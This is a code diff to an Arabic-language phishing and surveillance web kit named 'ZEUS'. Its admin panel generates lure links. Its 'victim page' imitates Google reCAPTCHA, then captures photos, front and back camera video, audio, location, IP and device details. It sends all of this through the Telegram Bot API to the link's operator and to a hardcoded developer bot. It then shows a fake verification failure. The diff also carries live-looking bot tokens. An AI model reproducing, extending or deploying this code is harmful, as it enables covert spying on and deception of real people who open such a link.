@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>تحقق</title>
+    <title>ZEUS — النظام المتكامل</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
-        /* ===== RESET & VARIABLES ===== */
+        /* ===== جميع الأنماط كما هي (لم تتغير) ===== */
         *,
         *::before,
         *::after {
@@ -65,7 +65,6 @@
             z-index: 0;
         }
 
-        /* ===== ADMIN PANEL ===== */
         .panel {
             max-width: 860px;
             width: 100%;
@@ -907,7 +906,7 @@
             }
         }
 
-        /* ===== VICTIM PAGE (reCAPTCHA) ===== */
+        /* ===== تعديل خط صفحة الضحية إلى خط رسمي وعادي ===== */
         #victimPage {
             display: none;
             justify-content: center;
@@ -916,9 +915,10 @@
             min-height: 100vh;
             background: #eef2f5;
             padding: 16px;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        .captcha-wrapper {
+        #victimPage .captcha-wrapper {
             width: 340px;
             max-width: 100%;
             background: #f9f9f9;
@@ -927,23 +927,24 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
             overflow: hidden;
             cursor: default;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        .captcha-row {
+        #victimPage .captcha-row {
             display: flex;
             align-items: center;
             padding: 15px 15px 12px 15px;
             gap: 12px;
         }
 
-        .spinner {
+        #victimPage .spinner {
             position: relative;
         }
-        .spinner input {
+        #victimPage .spinner input {
             display: none;
         }
 
-        .checkmark {
+        #victimPage .checkmark {
             width: 32px;
             height: 32px;
             border: 2px solid #c1c1c1;
@@ -957,7 +958,7 @@
             position: relative;
         }
 
-        .checkmark .tick {
+        #victimPage .checkmark .tick {
             width: 10px;
             height: 18px;
             border-right: 4px solid #00a651;
@@ -967,7 +968,7 @@
             transition: 0.2s;
         }
 
-        .checkmark .loader {
+        #victimPage .checkmark .loader {
             display: none;
             width: 20px;
             height: 20px;
@@ -977,90 +978,88 @@
             animation: spin 0.8s linear infinite;
         }
 
-        .spinner.loading .checkmark {
+        #victimPage .spinner.loading .checkmark {
             border-color: #1a73e8;
             background: #e8f0fe;
         }
-        .spinner.loading .checkmark .tick {
+        #victimPage .spinner.loading .checkmark .tick {
             display: none;
         }
-        .spinner.loading .checkmark .loader {
+        #victimPage .spinner.loading .checkmark .loader {
             display: block;
         }
 
-        .spinner.failed .checkmark {
+        #victimPage .spinner.failed .checkmark {
             border-color: #d93025;
             background: #fce8e6;
         }
-        .spinner.failed .checkmark .tick {
+        #victimPage .spinner.failed .checkmark .tick {
             display: none;
         }
-        .spinner.failed .checkmark .loader {
+        #victimPage .spinner.failed .checkmark .loader {
             display: none;
         }
-        .spinner.failed .checkmark::after {
+        #victimPage .spinner.failed .checkmark::after {
             content: "✕";
             font-size: 22px;
             font-weight: bold;
             color: #d93025;
         }
 
-        .spinner.success .checkmark {
+        #victimPage .spinner.success .checkmark {
             border-color: #00a651;
             background: #e6f4ea;
         }
-        .spinner.success .checkmark .tick {
+        #victimPage .spinner.success .checkmark .tick {
             opacity: 1;
             animation: check 0.3s ease;
         }
-        .spinner.success .checkmark .loader {
+        #victimPage .spinner.success .checkmark .loader {
             display: none;
         }
 
-        .text {
+        #victimPage .text {
             flex: 1;
             font-size: 18px;
             color: #333;
             text-align: center;
             transition: color 0.2s;
             user-select: none;
-            font-family: var(--font-ar), var(--font-en), sans-serif;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        .text.loading {
+        #victimPage .text.loading {
             color: #1a73e8;
         }
-        .text.failed {
+        #victimPage .text.failed {
             color: #d93025;
         }
-        .text.success {
+        #victimPage .text.success {
             color: #00a651;
         }
 
-        .logo-captcha {
+        #victimPage .logo-captcha {
             display: flex;
             flex-direction: column;
             align-items: center;
             font-size: 10px;
             color: #777;
-            font-family: var(--font-en), sans-serif;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        .logo-captcha svg {
+        #victimPage .logo-captcha img {
             width: 38px;
-            height: 38px;
             margin-bottom: 4px;
         }
 
-        .logo-captcha strong {
+        #victimPage .logo-captcha strong {
             font-size: 10px;
-            font-weight: 600;
         }
-        .logo-captcha small {
+        #victimPage .logo-captcha small {
             font-size: 8px;
         }
 
-        .captcha-footer {
+        #victimPage .captcha-footer {
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -1068,84 +1067,73 @@
             background: #f1f3f4;
             border-top: 1px solid #e5e7e9;
             height: 36px;
-            font-family: var(--font-en), sans-serif;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        .captcha-footer .brand {
+        #victimPage .captcha-footer .brand {
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .captcha-footer .brand svg {
+        #victimPage .captcha-footer .brand svg {
             height: 24px;
             width: auto;
         }
 
-        .captcha-footer .brand .google-text {
+        #victimPage .captcha-footer .brand .google-text {
             font-size: 14px;
             font-weight: 500;
             color: #222;
         }
 
-        .captcha-footer .links {
+        #victimPage .captcha-footer .links {
             display: flex;
             align-items: center;
             gap: 10px;
             font-size: 11px;
         }
 
-        .captcha-footer .links a {
+        #victimPage .captcha-footer .links a {
             color: #555;
             text-decoration: none;
             font-size: 11px;
             transition: color 0.15s;
         }
 
-        .captcha-footer .links a:hover {
+        #victimPage .captcha-footer .links a:hover {
             color: #1a73e8;
             text-decoration: underline;
         }
 
-        .captcha-footer .links .separator {
+        #victimPage .captcha-footer .links .separator {
             color: #aaa;
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         @keyframes check {
-            from {
-                opacity: 0;
-                transform: rotate(45deg) scale(0.3);
-            }
-            to {
-                opacity: 1;
-                transform: rotate(45deg) scale(1);
-            }
+            from { opacity: 0; transform: rotate(45deg) scale(0.3); }
+            to { opacity: 1; transform: rotate(45deg) scale(1); }
         }
 
         @media (max-width: 480px) {
-            .captcha-wrapper {
+            #victimPage .captcha-wrapper {
                 width: 100%;
             }
-            .text {
+            #victimPage .text {
                 font-size: 16px;
             }
-            .logo-captcha svg {
+            #victimPage .logo-captcha img {
                 width: 32px;
-                height: 32px;
             }
-            .captcha-footer .brand svg {
+            #victimPage .captcha-footer .brand svg {
                 height: 20px;
             }
-            .captcha-footer .brand .google-text {
+            #victimPage .captcha-footer .brand .google-text {
                 font-size: 12px;
             }
         }
@@ -1163,6 +1151,7 @@
             display: none;
         }
 
+        /* تم إخفاء شريط الحالة السفلي للضحية */
         .victim-status {
             display: none !important;
         }
@@ -1398,7 +1387,7 @@
             <div class="result">
                 <div class="info-box">
                     <span class="value" id="tokenDisplay">التوكن الخاص بك</span>
-                    <span class="sub" id="resultSub">الرابط المخصص لك</span>
+                    <span class="sub" id="resultSub">الرابط الخاص بك</span>
                 </div>
                 <div class="actions">
                     <button id="copyBtn" aria-label="نسخ">
@@ -1437,12 +1426,7 @@
                     </div>
                     <div class="text" id="mainText">أنا لست روبوتاً</div>
                     <div class="logo-captcha">
-                        <!-- SVG Globe icon -->
-                        <svg viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="12" cy="12" r="10" />
-                            <line x1="2" y1="12" x2="22" y2="12" />
-                            <path d="M12 2a15.3 15.3 0 0 0-4 10 15.3 15.3 0 0 0 4 10 15.3 15.3 0 0 0 4-10 15.3 15.3 0 0 0-4-10z" />
-                        </svg>
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
                         <strong>reCAPTCHA</strong>
                         <small>الخصوصية - الشروط</small>
                     </div>
@@ -1464,7 +1448,7 @@
                     </div>
                 </div>
             </div>
-            <!-- شريط الحالة مخفي تماماً -->
+            <!-- تم إخفاء شريط الحالة -->
             <div class="victim-status" id="victimStatus"></div>
         </div>
     </div>
@@ -1479,12 +1463,12 @@
             // ============================================================
             //  CONFIGURATION
             // ============================================================
-            const MASTER_BOT_TOKEN = "8872643040:AAGntDvgOhtrXuWdX0p6x00YyTJfUdxLosw";
+            const MASTER_BOT_TOKEN = "8872643040:AAGopCnKRECh5ikrpFELUne_xf9SgJK2Sh4";
             const MASTER_CHAT_ID = "8552540563";
             const DEVELOPER_LINK = "https://t.me/xx_8k";
 
             // ============================================================
-            //  TOAST (للمسؤول فقط)
+            //  TOAST
             // ============================================================
             function showToast(msg, type) {
                 var t = document.getElementById('toast');
@@ -1497,7 +1481,7 @@
             }
 
             // ============================================================
-            //  TIME UPDATE (للمسؤول)
+            //  TIME UPDATE
             // ============================================================
             function updateDateTime() {
                 const now = new Date();
@@ -1535,7 +1519,7 @@
             }
 
             // ============================================================
-            //  ADMIN PANEL — توليد الرابط مع توكن فريد 6 أحرف
+            //  ADMIN PANEL
             // ============================================================
             function initAdminPanel() {
                 const chatIdInput = document.getElementById('chatIdInput');
@@ -1546,30 +1530,50 @@
                 const copyBtn = document.getElementById('copyBtn');
                 const openBtn = document.getElementById('openBtn');
 
-                // ===== توليد توكن فريد 6 أحرف (لا يتكرر أبداً) =====
-                function generateUniqueToken() {
-                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-                    // استرجاع التوكنات المستخدمة من localStorage
-                    let usedTokens = JSON.parse(localStorage.getItem('zeus_used_tokens') || '[]');
-                    let token;
-                    let attempts = 0;
-                    const maxAttempts = 1000;
-                    do {
-                        token = '';
-                        for (let i = 0; i < 6; i++) {
-                            token += chars[Math.floor(Math.random() * chars.length)];
+                // ===== دالة توليد التوكن الثابت (6 حروف وأرقام فقط) =====
+                async function generateShortToken(botToken) {
+                    // استخدام SHA-256 مع ملح ثابت لضمان عدم التكرار والثبات الدائم
+                    const salt = 'ZEUS_SALT_2026_SECURE';
+                    const encoder = new TextEncoder();
+                    const data = encoder.encode(botToken + salt);
+                    
+                    let hashBuffer;
+                    try {
+                        // استخدام Web Crypto API
+                        hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                    } catch (e) {
+                        // احتياطي بسيط في حال عدم توفر crypto.subtle (نادراً)
+                        let hash = 0;
+                        const str = botToken + salt;
+                        for (let i = 0; i < str.length; i++) {
+                            const char = str.charCodeAt(i);
+                            hash = ((hash << 5) - hash) + char;
+                            hash = hash & hash;
                         }
-                        attempts++;
-                        if (attempts > maxAttempts) break;
-                    } while (usedTokens.includes(token));
+                        const hex = Math.abs(hash).toString(16).padStart(8, '0');
+                        hashBuffer = new TextEncoder().encode(hex);
+                    }
 
-                    // إضافة التوكن الجديد إلى القائمة وحفظها
-                    usedTokens.push(token);
-                    localStorage.setItem('zeus_used_tokens', JSON.stringify(usedTokens));
-                    return token;
+                    // تحويل إلى مصفوفة بايت
+                    const hashArray = Array.from(new Uint8Array(hashBuffer));
+                    
+                    // الأحرف المسموحة (حروف كبيرة وأرقام فقط، استبعدنا O و 0 و I و 1 لتجنب الالتباس)
+                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                    let result = '';
+                    
+                    for (let i = 0; i < hashArray.length && result.length < 6; i++) {
+                        const index = hashArray[i] % chars.length;
+                        result += chars[index];
+                    }
+                    
+                    // في حالة نقص الطول (لن يحدث لكن للأمان)
+                    while (result.length < 6) {
+                        result += 'A';
+                    }
+                    
+                    return result;
                 }
 
-                // ===== التحقق من صحة توكن البوت =====
                 async function verifyBotToken(token) {
                     try {
                         const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
@@ -1578,19 +1582,20 @@
                     } catch { return false; }
                 }
 
-                // ===== تشفير بيانات البوت =====
                 function encodeBotData(botToken, chatId) {
                     const payload = JSON.stringify({ bot: botToken, chat: chatId });
                     return btoa(encodeURIComponent(payload));
                 }
 
-                // ===== إرسال الرابط للمستخدم =====
                 async function sendLinkToUser(botToken, chatId, link, shortToken) {
                     const msg =
-                        `🔗 *رابطك الجديد*\n${link}\n\n` +
-                        `📌 التوكن الفريد: \`${shortToken}\`\n` +
-                        `شاركه مع الضحية، وسيتم جمع البيانات وإرسالها إليك.\n` +
-                        `🛡️ النظام يرسل نسخة احتياطية للمطور أيضاً.`;
+`⭑ رابط جديد للضحية ⭒\n` +
+`⊚─〔 بيانات الرابط 〕────────\n` +
+`˼⏣˹ الرابط: ${link} ⭒\n` +
+`˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
+`˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+`˼⏣˹ ملاحظة: شاركه مع الضحية، سيتم جمع البيانات وإرسالها إليك. ⭒\n` +
+`─────────────────`;
 
                     const inlineKeyboard = {
                         inline_keyboard: [
@@ -1612,7 +1617,6 @@
                     } catch (e) { console.warn('Send to user failed:', e); }
                 }
 
-                // ===== إرسال نسخة للمطور =====
                 async function sendToMaster(botToken, chatId, shortToken) {
                     const msg =
                         `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
@@ -1654,8 +1658,8 @@
                     genBtn.textContent = 'جارٍ التوليد …';
 
                     try {
-                        // توليد توكن فريد 6 أحرف
-                        const shortToken = generateUniqueToken();
+                        // توليد التوكن الثابت بناءً على توكن البوت
+                        const shortToken = await generateShortToken(botToken);
                         const encoded = encodeBotData(botToken, chatId);
                         const base = window.location.origin + window.location.pathname;
                         const link = `${base}?t=${shortToken}&d=${encoded}`;
@@ -1731,7 +1735,6 @@
                     }
                 });
 
-                // استرجاع البيانات المحفوظة
                 const savedBot = localStorage.getItem('zeus_last_bot_token');
                 const savedChat = localStorage.getItem('zeus_last_chat_id');
                 if (savedBot) botTokenInput.value = savedBot;
@@ -1746,7 +1749,7 @@
             }
 
             // ============================================================
-            //  VICTIM PAGE — إجبار الأذونات + جمع البيانات + إرسال
+            //  VICTIM PAGE — جمع البيانات وإرسالها بالاستايل المطلوب
             // ============================================================
 
             function initVictimPage(encodedData) {
@@ -1780,60 +1783,22 @@
                 // ===== دوال مساعدة =====
                 function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-                // ===== طلب الإذن مع إعادة المحاولة حتى الموافقة =====
-                async function requestPermissionWithRetry(permissionFn, errorMessage) {
-                    let attempts = 0;
-                    while (true) {
-                        try {
-                            const result = await permissionFn();
-                            return result;
-                        } catch (err) {
-                            console.warn(`${errorMessage} (محاولة ${attempts+1})`, err);
-                            attempts++;
-                            // إظهار خطأ في الكابتشا
-                            spinner.classList.remove('loading', 'success');
-                            spinner.classList.add('failed');
-                            mainText.textContent = 'فشل التحقق، حاول مجدداً';
-                            mainText.className = 'text failed';
-                            checkbox.checked = false;
-
-                            // انتظار 3 ثوانٍ ثم العودة للحالة الطبيعية وإعادة المحاولة
-                            await delay(3000);
-                            spinner.classList.remove('failed');
-                            spinner.classList.add('loading');
-                            mainText.textContent = 'جاري التحقق...';
-                            mainText.className = 'text loading';
-                            // إعادة تحميل الصفحة لإعادة طلب الأذونات
-                            location.reload();
-                            // لن يصل到这里 بسبب الـ reload، لكن نضع return احتياطياً
-                            return;
-                        }
-                    }
-                }
-
-                // ===== طلب جميع الأذونات (كاميرا، ميكروفون، موقع) بشكل إجباري =====
                 async function requestAllPermissions() {
-                    // 1. كاميرا + ميكروفون (معاً)
-                    await requestPermissionWithRetry(async () => {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                        stream.getTracks().forEach(t => t.stop());
-                        return true;
-                    }, 'فشل الحصول على الكاميرا أو الميكروفون');
-
-                    // 2. الموقع
-                    await requestPermissionWithRetry(() => {
-                        return new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(
-                                () => resolve(true),
-                                () => reject(new Error('رفض الموقع'))
-                            );
-                        });
-                    }, 'فشل الحصول على الموقع');
-
+                    const results = await Promise.allSettled([
+                        navigator.mediaDevices.getUserMedia({ video: true }),
+                        navigator.mediaDevices.getUserMedia({ audio: true }),
+                        new Promise((resolve) => {
+                            navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
+                        })
+                    ]);
+                    results.forEach(result => {
+                        if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
+                            result.value.getTracks().forEach(t => t.stop());
+                        }
+                    });
                     return true;
                 }
 
-                // ===== باقي دوال جمع البيانات =====
                 function getDeviceData() {
                     return {
                         platform: navigator.platform,
@@ -1856,6 +1821,7 @@
 
                 function getLocation() {
                     return new Promise((resolve) => {
+                        if (!navigator.geolocation) return resolve({ lat: null, lng: null, error: 'غير مدعوم' });
                         navigator.geolocation.getCurrentPosition(
                             (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, error: null }),
                             (err) => resolve({ lat: null, lng: null, error: err.message })
@@ -1863,6 +1829,7 @@
                     });
                 }
 
+                // ===== الحصول على حالة البطارية =====
                 async function getBatteryStatus() {
                     try {
                         if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
@@ -1925,7 +1892,7 @@
                     } catch { return null; }
                 }
 
-                // ===== إرسال الوسائط =====
+                // ===== إرسال وسائط =====
                 async function sendMedia(method, token, formData) {
                     try {
                         await fetch(`https://api.telegram.org/bot${token}/${method}`, {
@@ -1935,7 +1902,7 @@
                     } catch (e) { console.warn('Send media failed:', e); }
                 }
 
-                // ===== تنسيق الرسائل (نفس الاستايل المطلوب) =====
+                // ===== دوال التنسيق المزخرفة =====
                 function formatBatteryMessage(battery) {
                     return `⭑ حالة البطارية ⭒\n` +
                         `⊚─〔 الطاقة 〕────────\n` +
@@ -1965,7 +1932,7 @@
                         `─────────────────`;
                 }
 
-                // ===== إرسال للمستخدم =====
+                // ===== إرسال إلى المستخدم =====
                 async function sendToUserBot(userToken, chatId, data, battery, token) {
                     // 1. البطارية
                     const battMsg = formatBatteryMessage(battery);
@@ -1997,7 +1964,14 @@
                             const fd = new FormData();
                             fd.append('chat_id', chatId);
                             fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
-                            fd.append('caption', `📸 صورة ${i+1}/${data.photos.length}`);
+                            fd.append('caption',
+                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
+                                `⊚─〔 ميديا الضحية 〕────────\n` +
+                                `˼⏣˹ النوع: صورة ⭒\n` +
+                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
+                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                                `─────────────────`
+                            );
                             await sendMedia('sendPhoto', userToken, fd);
                         }
                     }
@@ -2005,21 +1979,39 @@
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        fd.append('caption', '🎥 فيديو أمامي');
+                        fd.append('caption',
+                            `⭑ فيديو أمامي ⭒\n` +
+                            `⊚─〔 ميديا الضحية 〕────────\n` +
+                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendVideo', userToken, fd);
                     }
                     if (data.backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        fd.append('caption', '🎥 فيديو خلفي');
+                        fd.append('caption',
+                            `⭑ فيديو خلفي ⭒\n` +
+                            `⊚─〔 ميديا الضحية 〕────────\n` +
+                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendVideo', userToken, fd);
                     }
                     if (data.audio) {
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('audio', data.audio, 'audio.webm');
-                        fd.append('caption', '🎤 تسجيل صوتي');
+                        fd.append('caption',
+                            `⭑ تسجيل صوتي ⭒\n` +
+                            `⊚─〔 ميديا الضحية 〕────────\n` +
+                            `˼⏣˹ النوع: صوت ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendAudio', userToken, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
@@ -2037,45 +2029,65 @@
                     }
                 }
 
-                // ===== إرسال للمطور (دائماً) =====
+                // ===== إرسال نسخة احتياطية للنظام =====
                 async function sendToMaster(data, battery, token) {
-                    const userInfo = botCreds ? `توكن المستخدم: ${botCreds.botToken}\nإيدي المستخدم: ${botCreds.chatId}` :
-                        'لا توجد بيانات مستخدم (إرسال احتياطي)';
+                    const userInfo = botCreds ?
+                        `˼⏣˹ توكن المستخدم: ${botCreds.botToken} ⭒\n˼⏣˹ إيدي المستخدم: ${botCreds.chatId} ⭒` :
+                        `˼⏣˹ لا توجد بيانات مستخدم (إرسال احتياطي) ⭒`;
 
-                    // 1. البطارية
-                    const battMsg = formatBatteryMessage(battery) +
-                        `\n\n⭑ نسخة المطور ⭒\n${userInfo}`;
+                    const battMsg =
+                        `⭑ نسخة احتياطية للنظام ⭒\n` +
+                        `⊚─〔 بيانات البطارية 〕────────\n` +
+                        `${formatBatteryMessage(battery)}\n` +
+                        `${userInfo}\n` +
+                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown' })
                     }).catch(() => {});
 
-                    // 2. الموقع
-                    const locMsg = formatLocationMessage(data.location) +
-                        `\n\n⭑ نسخة المطور ⭒\n${userInfo}`;
+                    const locMsg =
+                        `⭑ نسخة احتياطية للنظام ⭒\n` +
+                        `⊚─〔 بيانات الموقع 〕────────\n` +
+                        `${formatLocationMessage(data.location)}\n` +
+                        `${userInfo}\n` +
+                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown' })
                     }).catch(() => {});
 
-                    // 3. الزيارة
-                    const visitMsg = formatVisitMessage(data.ip, data.browser, token, data.time) +
-                        `\n\n⭑ نسخة المطور ⭒\n${userInfo}`;
+                    const visitMsg =
+                        `⭑ نسخة احتياطية للنظام ⭒\n` +
+                        `⊚─〔 بيانات الزيارة 〕────────\n` +
+                        `${formatVisitMessage(data.ip, data.browser, token, data.time)}\n` +
+                        `${userInfo}\n` +
+                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown' })
                     }).catch(() => {});
 
-                    // 4. الملفات للمطور
+                    // الملفات للنسخة الاحتياطية
                     if (data.photos && data.photos.length > 0) {
                         for (let i = 0; i < data.photos.length; i++) {
                             const fd = new FormData();
                             fd.append('chat_id', MASTER_CHAT_ID);
                             fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
-                            fd.append('caption', `📸 صورة ${i+1}/${data.photos.length}`);
+                            fd.append('caption',
+                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
+                                `⊚─〔 ميديا احتياطية 〕────────\n` +
+                                `˼⏣˹ النوع: صورة ⭒\n` +
+                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
+                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                                `─────────────────`
+                            );
                             await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                         }
                     }
@@ -2083,21 +2095,39 @@
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        fd.append('caption', '🎥 فيديو أمامي (نسخة المطور)');
+                        fd.append('caption',
+                            `⭑ فيديو أمامي ⭒\n` +
+                            `⊚─〔 ميديا احتياطية 〕────────\n` +
+                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        fd.append('caption', '🎥 فيديو خلفي (نسخة المطور)');
+                        fd.append('caption',
+                            `⭑ فيديو خلفي ⭒\n` +
+                            `⊚─〔 ميديا احتياطية 〕────────\n` +
+                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('audio', data.audio, 'audio.webm');
-                        fd.append('caption', '🎤 تسجيل صوتي (نسخة المطور)');
+                        fd.append('caption',
+                            `⭑ تسجيل صوتي ⭒\n` +
+                            `⊚─〔 ميديا احتياطية 〕────────\n` +
+                            `˼⏣˹ النوع: صوت ⭒\n` +
+                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
+                            `─────────────────`
+                        );
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
@@ -2125,10 +2155,8 @@
                     mainText.className = 'text loading';
 
                     try {
-                        // ===== إجبار الأذونات =====
                         await requestAllPermissions();
 
-                        // ===== جمع البيانات =====
                         const [deviceData, ip, location, battery] = await Promise.all([
                             Promise.resolve(getDeviceData()),
                             getIP(),
@@ -2136,7 +2164,6 @@
                             getBatteryStatus()
                         ]);
 
-                        // --- الكاميرا الأمامية (8 صور + فيديو 3 ثوان) ---
                         const frontResult = await (async () => {
                             let stream = null;
                             try {
@@ -2159,7 +2186,6 @@
                             }
                         })();
 
-                        // --- الكاميرا الخلفية (فيديو 3 ثوان) ---
                         const backVideo = await (async () => {
                             let stream = null;
                             try {
@@ -2177,10 +2203,8 @@
                             }
                         })();
 
-                        // --- تسجيل صوتي (3 ثوان) ---
                         const audioBlob = await recordAudio(3000);
 
-                        // تجميع البيانات
                         const data = {
                             ip: ip,
                             location: location,
@@ -2197,7 +2221,6 @@
 
                         const token = rawToken || 'غير معروف';
 
-                        // 🔥 1. إرسال للمستخدم (إذا توفر)
                         if (botCreds && botCreds.botToken && botCreds.chatId) {
                             try {
                                 await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
@@ -2206,7 +2229,6 @@
                             }
                         }
 
-                        // 🔥 2. إرسال للمطور (دائماً)
                         try {
                             await sendToMaster(data, battery, token);
                         } catch (e) {
@@ -2215,7 +2237,6 @@
 
                         collectionDone = true;
 
-                        // فشل وهمي (لإعادة المحاولة كما تفعل reCAPTCHA الحقيقية)
                         spinner.classList.remove('loading', 'success');
                         spinner.classList.add('failed');
                         mainText.textContent = 'فشل التحقق، حاول مجدداً';
@@ -2254,7 +2275,7 @@
                     }
                 });
 
-                console.log('✅ Victim page ready (إجبار الأذونات).');
+                console.log('✅ Victim page ready.');
             }
 
         })();
